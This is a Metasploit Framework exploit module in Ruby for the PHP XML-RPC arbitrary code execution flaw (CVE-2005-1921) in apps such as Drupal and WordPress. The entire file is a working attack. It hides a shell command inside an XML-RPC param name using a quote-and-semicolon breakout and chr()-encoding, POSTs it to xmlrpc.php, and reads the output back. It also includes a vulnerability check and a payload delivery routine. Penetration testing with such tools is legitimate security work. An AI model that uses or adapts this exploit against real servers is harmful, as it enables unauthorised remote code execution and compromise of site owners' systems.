##
# $Id: php_xmlrpc_eval.rb 9929 2010-07-25 21:37:54Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	# XXX This module needs an overhaul
	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'PHP XML-RPC Arbitrary Code Execution\',
			\'Description\'    => %q{
					This module exploits an arbitrary code execution flaw
				discovered in many implementations of the PHP XML-RPC module.
				This flaw is exploitable through a number of PHP web
				applications, including but not limited to Drupal, Wordpress,
				Postnuke, and TikiWiki.
			},
			\'Author\'         => [ \'hdm\', \'cazz\' ],
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 9929 $\',
			\'References\'     =>
				[
					[\'CVE\', \'2005-1921\'],
					[\'OSVDB\', \'17793\'],
					[\'BID\', \'14088\'],
				],
			\'Privileged\'     => false,
			\'Platform\'       => [\'unix\', \'solaris\'],
			\'Payload\'        => {
					\'Space\' => 512,
					\'DisableNops\' => true,
					\'Keys\'  => [\'cmd\', \'cmd_bash\'],
				},
			\'Targets\'        => [ [\'Automatic\', { }], ],
			\'DefaultTarget\' => 0,
			\'DisclosureDate\' => \'Jun 29 2005\'
			))


		register_options(
			[
				OptString.new(\'PATH\', [ true,  \"Path to xmlrpc.php\", \'/xmlrpc.php\']),
			], self.class)

		deregister_options(
			\'HTTP::junk_params\', # not your typical POST, so don\'t inject params.
			\'HTTP::junk_slashes\' # For some reason junk_slashes doesn\'t always work, so turn that off for now.
			)
	end

	def go(command)

		encoded = command.unpack(\"C*\").collect{|x| \"chr(#{x})\"}.join(\'.\')
		wrapper = rand_text_alphanumeric(rand(128)+32)

		cmd = \"echo(\'#{wrapper}\'); passthru(#{ encoded }); echo(\'#{wrapper}\');;\"

		xml =
		\'<?xml version=\"1.0\"?>\' +
		\"<methodCall>\" +
			\"<methodName>\"+ rand_text_alphanumeric(rand(128)+32) + \"</methodName>\" +
			\"<params><param>\" +
				\"<name>\" + rand_text_alphanumeric(rand(128)+32) + \"\');#{cmd}//</name>\" +
				\"<value>\" + rand_text_alphanumeric(rand(128)+32) + \"</value>\" +
			\"</param></params>\" +
		\"</methodCall>\";

		res = send_request_cgi({
				\'uri\'          => datastore[\'PATH\'],
				\'method\'       => \'POST\',
				\'ctype\'        => \'application/xml\',
				\'data\'         => xml,
			}, 5)

		if (res and res.body)
			b = /#{wrapper}(.*)#{wrapper}/sm.match(res.body)
			if b
				return b.captures[0]
			elsif datastore[\'HTTP::chunked\'] == true
				b = /chunked Transfer-Encoding forbidden/.match(res.body)
				if b
					raise RuntimeError, \'Target PHP installation does not support chunked encoding.  Support for chunked encoded requests was added to PHP on 12/15/2005, try disabling HTTP::chunked and trying again.\'
				end
			end
		end

		return nil
	end

	def check
		response = go(\"echo ownable\")
		if (!response.nil? and response =~ /ownable/sm)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		response = go(payload.encoded)
		if response == nil
			print_error(\'exploit failed: no response\')
		else
			if response.length == 0
				print_status(\'exploit successful\')
			else
				print_status(\"Command returned #{response}\")
			end
			handler
		end
	end
end
